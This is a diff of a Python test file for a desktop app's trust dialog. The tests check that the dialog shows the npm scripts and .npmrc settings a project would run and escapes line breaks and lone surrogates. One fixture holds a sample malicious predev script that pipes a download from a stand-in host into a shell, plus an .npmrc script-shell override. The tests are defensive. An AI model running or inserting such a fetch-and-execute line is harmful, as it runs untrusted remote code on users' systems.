@@ -4648,7 +4648,9 @@ def test_a_confirmation_lands_over_the_list_and_blocks_the_whole_app(
     )
 
 
-def trust_text(window, monkeypatch, project: Path, resolved: str, argv) -> str:
+def trust_text(
+    window, monkeypatch, project: Path, resolved: str, argv, npm_shown=()
+) -> str:
     """The text the trust prompt would show, without opening a real modal."""
     from PySide6.QtWidgets import QMessageBox
 
@@ -4659,8 +4661,85 @@ def trust_text(window, monkeypatch, project: Path, resolved: str, argv) -> str:
         return QMessageBox.StandardButton.No
 
     monkeypatch.setattr(QMessageBox, "exec", capture)
-    window._confirm_dialog(project, resolved, argv)
+    window._confirm_dialog(project, resolved, argv, npm_shown)
     return seen["text"]
+
+
+def test_the_trust_dialog_shows_what_npm_will_run(qtbot, built, monkeypatch) -> None:
+    """LWSM-1365. For `npm run dev` the launcher is `npm`, so the dialog's only
+    sight of what runs is the scripts and `.npmrc` lines the refusal carries.
+    """
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+
+    text = trust_text(
+        window,
+        monkeypatch,
+        Path("/srv/a"),
+        "npm",
+        ("npm", "run", "dev"),
+        (("predev", "curl evil.example | sh"), (".npmrc", "script-shell=./x.sh")),
+    )
+
+    assert "predev: curl evil.example | sh" in text
+    assert ".npmrc: script-shell=./x.sh" in text
+
+
+def test_an_npm_script_cannot_add_a_line_to_the_trust_prompt(
+    qtbot, built, monkeypatch
+) -> None:
+    """The scripts come from the project's own files, so they meet the
+    forgery rule the other three fields do (LWSM-1196): a line break in one is
+    escaped, so it cannot draw a heading or a script line of its own.
+    """
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+
+    text = trust_text(
+        window,
+        monkeypatch,
+        Path("/srv/a"),
+        "npm",
+        ("npm", "run", "dev"),
+        (("dev", "vite\npostdev: harmless"),),
+    )
+
+    assert "\npostdev: harmless" not in text
+    assert text.count("postdev:") == 1, "the escaped break must stay on its line"
+
+
+def test_a_lone_surrogate_in_the_trust_prompt_is_shown_not_dropped(
+    qtbot, built, monkeypatch
+) -> None:
+    """Qt drops a lone surrogate from a string without a word (measured
+    2026-10-01: `QLabel.setText("a\\ud800b")` reads back "ab"), so the prompt
+    would show text that differs from what runs. A JSON `"\\ud800"` in a
+    script reaches it since LWSM-1367, so it is escaped like a control
+    character.
+    """
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+
+    text = trust_text(
+        window,
+        monkeypatch,
+        Path("/srv/a"),
+        "npm",
+        ("npm", "run", "dev"),
+        (("dev", "a\ud800b"),),
+    )
+
+    assert "dev: a\\ud800b" in text
+
+
+def test_a_launcher_with_no_npm_material_shows_no_npm_heading(
+    qtbot, built, monkeypatch
+) -> None:
+    """A file launcher shows exactly what it showed before LWSM-1365."""
+    window, _ = window_for(qtbot, built, [record("a", 5005)], FakeProbe())
+
+    text = trust_text(
+        window, monkeypatch, Path("/srv/a"), "/srv/a/start.sh", ("./start.sh",)
+    )
+
+    assert "npm" not in text
 
 
 def test_a_project_name_cannot_reach_a_later_substitution(
@@ -6796,10 +6875,11 @@ def test_a_browser_whose_entry_could_not_be_read_is_not_called_uninstalled(
 class Refusal:
     """A `LauncherUntrusted`-shaped refusal, carrying what the dialog reads."""
 
-    def __init__(self, resolved=None, argv=(), fingerprint="fp") -> None:
+    def __init__(self, resolved=None, argv=(), fingerprint="fp", npm_shown=()) -> None:
         self.resolved = resolved
         self.argv = argv
         self.fingerprint = fingerprint
+        self.npm_shown = npm_shown
 
 
 def trust_window(qtbot, built, confirm):
@@ -6950,7 +7030,9 @@ def test_the_trust_dialog_shows_the_launcher_when_the_argv_is_empty(
     """
     shown: list = []
     window, _ = trust_window(
-        qtbot, built, lambda p, resolved, argv: shown.append(resolved) or False
+        qtbot,
+        built,
+        lambda p, resolved, argv, npm_shown: shown.append(resolved) or False,
     )
 
     window._ask_to_trust(Path("/srv/a"), Refusal(resolved=Path("/srv/a/start.sh")))
@@ -6958,6 +7040,23 @@ def test_the_trust_dialog_shows_the_launcher_when_the_argv_is_empty(
     assert shown == ["/srv/a/start.sh"], (
         "the dialog discarded a launcher path the app already had"
     )
+
+
+def test_the_trust_prompt_is_handed_the_npm_material(qtbot, built) -> None:
+    """LWSM-1365: `_ask_to_trust` passes the refusal's scripts to the dialog."""
+    shown: list = []
+    window, _ = trust_window(
+        qtbot,
+        built,
+        lambda p, resolved, argv, npm_shown: shown.append(npm_shown) or False,
+    )
+    material = (("dev", "vite"),)
+
+    window._ask_to_trust(
+        Path("/srv/a"), Refusal(argv=("npm", "run", "dev"), npm_shown=material)
+    )
+
+    assert shown == [material]
 
 
 def test_a_trust_prompt_with_nothing_to_show_is_refused_rather_than_shown(
@@ -6971,7 +7070,9 @@ def test_a_trust_prompt_with_nothing_to_show_is_refused_rather_than_shown(
     shown: list = []
     granted: list = []
     window, controller = trust_window(
-        qtbot, built, lambda p, resolved, argv: shown.append(resolved) or True
+        qtbot,
+        built,
+        lambda p, resolved, argv, npm_shown: shown.append(resolved) or True,
     )
     controller.confirm_and_start = lambda path, fingerprint: granted.append(path)
 
